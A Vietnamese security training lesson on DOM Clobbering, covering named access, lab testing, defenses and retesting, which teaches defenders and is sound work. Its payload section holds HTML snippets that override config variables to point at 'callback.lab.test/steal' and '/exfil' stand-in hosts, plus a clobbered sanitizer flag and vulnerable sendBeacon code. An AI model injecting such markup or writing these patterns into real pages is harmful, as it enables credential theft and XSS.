---
schema_version: 1
id: WEB-A05-DOM-CLOBBERING
title: "DOM Clobbering"
slug: dom-clobbering
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  - A05:2025
cwe:
  - CWE-79
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# DOM Clobbering

> [!CAUTION]
> Chỉ thực hành trên hệ thống bạn sở hữu hoặc có ủy quyền rõ ràng. Dùng dữ liệu giả, fixture có thể hủy và giới hạn tài nguyên; không gửi payload đến Internet hoặc mục tiêu thật.

## 1. Mục tiêu học tập

Sau bài học, bạn có thể:

- Giải thích DOM Clobbering bằng root cause thay vì chỉ mô tả hậu quả.
- Nhận diện trust boundary, tài sản, actor và điều kiện cần để lỗi có thể bị khai thác.
- Thực hiện kiểm thử có kiểm soát trong lab local và phân biệt expected result với false positive.
- Chọn kiểm soát gốc, triển khai bản sửa và retest bằng positive, negative và boundary case.

## 2. Kiến thức cần có

- Nắm luồng HTTP request/response và cách ứng dụng xử lý input qua các trust boundary.
- Phân biệt authentication, authorization và validation.
- Biết đọc code/configuration trong ngôn ngữ hoặc framework xuất hiện ở ví dụ.
- Có lab local cô lập, dữ liệu giả, log quan sát được và quyền kiểm thử rõ ràng.

## 3. Kiến thức nền tảng

HTML định nghĩa các thuật toán named access cụ thể cho `Window` và một số collection/form. Không phải mọi phần tử có `id`/`name` đều trở thành cùng một loại property trên cả `window` lẫn `document`; kết quả còn phụ thuộc loại phần tử, tên trùng và thuật toán của chuẩn. [S4]

Named access có thể làm một phần tử mang `id` hoặc `name` xuất hiện dưới dạng thuộc tính trên `window` hoặc `document`, tùy thuật toán được HTML định nghĩa. Một số phần tử liên kết còn biểu diễn URL khi được chuyển thành chuỗi. Vì vậy mã ứng dụng không được dùng named property từ DOM như nguồn cấu hình tin cậy; input HTML cụ thể để xác nhận hành vi này nằm ở mục 8. [S4]

## 4. Mô tả và nguyên nhân gốc

Lỗ hổng DOM Clobbering xảy ra khi ứng dụng cho phép HTML không tin cậy tạo named property trùng với tên cấu hình mà JavaScript đang đọc. Việc chỉ loại bỏ phần tử script không giải quyết root cause: code vẫn lấy một giá trị kế thừa từ DOM thay vì một object cấu hình do ứng dụng sở hữu. Tác động chỉ được kết luận sau khi chứng minh có gadget tiêu thụ giá trị bị clobber; không phải mọi xung đột tên đều dẫn đến XSS hay chuyển hướng. [S1] [S2]

> **Gate kỹ thuật:** các nguồn cần được đối chiếu trực tiếp cho từng claim trước khi đổi `content_status` sang `verified`: [S1], [S2], [S3], [S4], [S5].

## 5. Mô hình đe dọa và điều kiện khai thác

- **Tài sản:** giá trị cấu hình phía client và cơ chế DOM property lookup.
- **Actor, xác thực và role:** người dùng chèn được HTML hạn chế; nạn nhân mở fixture với role user.
- **Điều kiện khai thác:** named DOM access biến element của actor thành giá trị mà code tin là cấu hình.
- **Browser, proxy, framework và phiên bản:** Chromium được pin trên .lab.test với fixture JavaScript tĩnh và không outbound; phải lưu image/package version thực tế cùng evidence.
- **Bằng chứng bắt buộc:** cùng correlation ID phải nối input, quyết định kiểm soát và tác động lên đúng tài sản; status code riêng lẻ không đủ. [S1]

## 6. Cơ chế tấn công

Đối với dom clobbering, named DOM access biến element của actor thành giá trị mà code tin là cấu hình. Positive case phải chứng minh input đến đúng sink và tạo tác động đã mô tả; negative case khi bật kiểm soát gốc phải bị chặn trước side effect. Kết luận chỉ áp dụng cho môi trường được pin ở mục 5. [S1]

## 7. Kiểm thử trong lab được ủy quyền

1. **Setup:** khởi chạy Chromium được pin trên .lab.test với fixture JavaScript tĩnh và không outbound; chỉ nạp dữ liệu tổng hợp, bật log ứng dụng/proxy/datastore và gắn correlation ID.
2. **Baseline:** gửi một input hợp lệ của use case dom clobbering; lưu raw request/response, quyết định policy và trạng thái tài sản trước test.
3. **Input và thao tác:** dùng đúng một payload cốt lõi ở mục 8 trong context đã annotation; thay đổi một biến mỗi lần và tuân thủ request cap.
4. **Expected result:** chỉ coi vulnerable fixture là positive khi log chứng minh cơ chế “named DOM access biến element của actor thành giá trị mà code tin là cấu hình”; secure fixture phải chặn trước side effect và boundary input phải fail closed.
5. **Cleanup:** xóa dữ liệu, marker và log của dom clobbering; thu hồi session/cache liên quan, hoàn nguyên snapshot và xác nhận không còn callback/process test.
6. **Giới hạn an toàn:** chỉ chạy trên loopback/`.lab.test`; không dùng target, credential hoặc dữ liệu thật; OOB/DoS/state-changing phải có network/CPU/memory/request cap.

## 8. Payload và phạm vi áp dụng

Các probe dưới đây vẫn ở `static-verified`; kết quả named access phải được retest trong Chromium version đã pin. [S2] [S4]

**Kịch bản 1 — Ghi đè biến cấu hình đơn giản:**

<!-- claim-source: [S1] [S4] -->
<!-- payload-id: WEB-A05-DOM-CLOBBERING-001 -->
<!-- context: HTML fragment inserted before application startup in pinned Chromium -->
<!-- prerequisites: callback.lab.test resolves to loopback; sanitizer permits a/id/href; no credentials or outbound network -->
<!-- encoding: UTF-8 HTML parsed in body context; href is an absolute .lab.test URL -->
<!-- expected-result: window.configUrl resolves to the anchor in vulnerable page; secure lexical config remains unchanged -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
<!-- Attacker injects this HTML (passes sanitizer since no script tags) -->
<a id="configUrl" href="https://callback.lab.test/steal">Click</a>
```

<!-- claim-source: [S1] [S4] -->
<!-- payload-id: WEB-A05-DOM-CLOBBERING-002 -->
<!-- context: JavaScript reads window.configUrl after WEB-A05-DOM-CLOBBERING-001 is inserted -->
<!-- prerequisites: both endpoints resolve locally; fetch is intercepted; synthetic cookie omitted; one execution -->
<!-- encoding: ECMAScript UTF-8 source; DOM anchor stringification yields its absolute href without extra decoding -->
<!-- expected-result: intercepted fetch targets callback.lab.test only in vulnerable case; secure code uses the fixed API URL -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```javascript
// Vulnerable application code
// Developer expects configUrl to be a string variable
let endpoint = window.configUrl || "https://api.legit.lab.test/data";

// After clobbering: endpoint = "https://callback.lab.test/steal"
// because <a>.toString() returns href value
fetch(endpoint, { credentials: "include" });
```

**Kịch bản 2 — Clobbering thuộc tính lồng nhau bằng `<form>`:**

<!-- claim-source: [S2] [S4] -->
<!-- payload-id: WEB-A05-DOM-CLOBBERING-003 -->
<!-- context: HTML form/input named properties evaluated in pinned Chromium -->
<!-- prerequisites: .lab.test origins map to loopback; the exact form is inserted once before script execution -->
<!-- encoding: UTF-8 HTML in body context; input value is parsed as an attribute and exposed as a string -->
<!-- expected-result: window.config.url.value equals the synthetic exfil URL; schema-based config does not read the form -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
<!-- Clobber window.config.url using form + input -->
<form id="config" name="config">
  <input name="url" value="https://callback.lab.test/exfil">
</form>

<script>
  // window.config -> <form> element
  // window.config.url -> <input> element
  // window.config.url.value -> "https://callback.lab.test/exfil"
  console.log(window.config.url.value); // attacker-controlled
</script>
```

**Kịch bản 3 — Bypass sanitizer để đạt XSS:**

<!-- claim-source: [S2] [S4] -->
<!-- payload-id: WEB-A05-DOM-CLOBBERING-004 -->
<!-- context: HTML named element collides with a boolean security configuration lookup -->
<!-- prerequisites: pinned Chromium; synthetic page with no sensitive HTML; no network requests -->
<!-- encoding: UTF-8 HTML body fragment; id uses ASCII and requires no URL encoding -->
<!-- expected-result: vulnerable truthy check treats the HTMLDivElement as proof content was sanitized and reaches the marker sink; secure strict-typed config rejects the element -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
<!-- Clobber a security flag that guards innerHTML assignment -->
<div id="sanitizerEnabled"></div>
<!-- window.sanitizerEnabled is now truthy (DOM element), but not boolean true -->
<script>
  // Vulnerable code assumes a truthy flag means upstream sanitization already ran.
  if (window.sanitizerEnabled) {
    document.documentElement.dataset.clobberBranch = "trusted-without-type-check";
  }
</script>
```

## 9. Code dễ bị lỗi và code an toàn

```javascript
// ❌ VULNERABLE: Global named-property lookup can be clobbered.
let url = window.analyticsEndpoint || "/api/analytics";
navigator.sendBeacon(url, JSON.stringify(userData));

// ✅ SECURE: Use local constant with type validation
const ANALYTICS_ENDPOINT = "/api/analytics";

function sendAnalytics(data) {
  // Hardcoded constant cannot be clobbered
  const url = ANALYTICS_ENDPOINT;

  // Additional URL validation
  if (!url.startsWith("/") && !url.startsWith("https://trusted.lab.test")) {
    throw new Error("Invalid analytics endpoint");
  }

  navigator.sendBeacon(url, JSON.stringify(data));
}
```

## 10. Phát hiện

- Ghi log actor/session, route hoặc operation, object/resource, kết quả policy và correlation ID; không ghi secret hoặc toàn bộ token.
- So sánh authorization/validation failure với baseline hợp lệ và cảnh báo theo chuỗi hành vi, không chỉ theo một chuỗi payload.
- Kết hợp telemetry ứng dụng, reverse proxy và datastore để xác nhận request đã tới sink và có/không có tác động.
- Scanner hoặc WAF alert chỉ là tín hiệu điều tra; không phải bằng chứng duy nhất rằng lỗ hổng tồn tại. [S1]

## 11. Phòng thủ

### Kiểm soát bắt buộc

- Giữ cấu hình bảo mật trong biến lexical và kiểm tra type/schema, không đọc named DOM property.
- Áp dụng cùng kiểm soát cho mọi route, operation và đường xử lý tương đương; thất bại phải dừng trước side effect.

### Defense-in-depth

Các biện pháp dưới đây hỗ trợ giảm blast radius hoặc tăng khả năng phát hiện. Rate limit, UUID khó đoán, WAF, CSP hoặc validation chung không được dùng để thay thế kiểm soát gốc.

- **Tóm tắt**: Tránh sử dụng biến toàn cục trên đối tượng window, sử dụng các biến có phạm vi giới hạn và áp dụng Trusted Types.
- **Các bước chi tiết**:
  - Không dùng biến toàn cục trên `window` — sử dụng `const`/`let` trong scope cục bộ hoặc module ES6.
  - Vệ sinh và kiểm duyệt DOM trước khi chèn bằng các thư viện như DOMPurify.
  - Sử dụng Trusted Types để kiểm soát các điểm chèn nhạy cảm (sinks); cơ chế này không thay thế việc giữ cấu hình ngoài named DOM properties. [S2] [S4]

## 12. Retest

- **Positive case:** luồng hợp lệ vẫn hoạt động đúng cho actor và dữ liệu được phép.
- **Negative case:** cùng input/tài nguyên nhưng actor hoặc context không được phép bị từ chối mà không rò rỉ chi tiết nhạy cảm.
- **Boundary case:** kiểm tra giá trị rỗng, cực biên, encoding khác, request lặp, trạng thái phiên hết hạn và đường dẫn/operation tương đương.
- **Telemetry:** xác nhận policy decision, application log, proxy log và datastore side effect khớp correlation ID.
- **Regression:** lưu testcase tối thiểu tái hiện lỗi cũ và testcase chứng minh bản sửa không phụ thuộc WAF/rate limit.

## 13. Sai lầm thường gặp

- Chỉ kiểm tra status code hoặc chuỗi phản hồi mà không xác nhận side effect và log.
- Dùng payload đúng cú pháp nhưng sai DBMS, browser, framework, protocol hoặc injection context.
- Coi UUID, rate limit, WAF, CSP hoặc input validation chung là bản sửa cho một kiểm soát gốc khác.
- Chỉ sửa một route trong khi cùng sink/policy được dùng ở route khác.
- Đánh dấu `verified` dù nguồn, phiên bản fixture hoặc evidence payload chưa được lưu.

## 14. Tóm tắt và checklist

- [ ] Root cause, hậu quả và kỹ thuật khai thác đã được tách riêng.
- [ ] Actor, role/authentication, trust boundary, công nghệ và phiên bản đã rõ.
- [ ] Payload có ID duy nhất, context, encoding, điều kiện, expected result, risk, validation và source.
- [ ] Code dễ lỗi/an toàn dùng cùng framework, phiên bản và use case.
- [ ] Kiểm soát bắt buộc không bị thay thế bằng defense-in-depth.
- [ ] Positive, negative, boundary case và telemetry đã qua retest.
- [ ] Claim nhạy cảm có source marker và mọi link chỉ nằm ở mục 16–17.
- [ ] Cleanup hoàn tất; không còn secret, target thật, callback Internet hoặc dữ liệu khách hàng.

## 15. Giải thích thuật ngữ

- **DOM Clobbering**: Ghi đè các đối tượng và biến JavaScript toàn cục thông qua thuộc tính HTML `id`/`name`.
- **DOM (Document Object Model)**: Mô hình đối tượng tài liệu cấu trúc phân cấp thể hiện nội dung trang web.
- **Named Access**: Cơ chế tự động truy cập phần tử HTML qua thuộc tính name/id như một biến JavaScript.
- **Sanitizer**: Thư viện hoặc công cụ làm sạch HTML để loại bỏ mã độc trước khi đưa lên trang.
- **Bypass**: Hành động làm cho luồng xử lý tránh hoặc vô hiệu một kiểm soát dự kiến; phải chứng minh bằng gadget/side effect cụ thể. [S1] [S2]

## 16. Bài liên quan và đọc thêm

- [DOM-based XSS](../xss/dom-based/) — Lỗ hổng XSS dựa trên DOM.

## 17. Tài liệu tham khảo

- **[S1]** PortSwigger. https://portswigger.net/web-security/dom-based/dom-clobbering — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S2]** OWASP DOM Clobbering Prevention Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S3]** CWE. https://cwe.mitre.org/data/definitions/79.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S4]** HTML Spec Named Access. https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S5]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
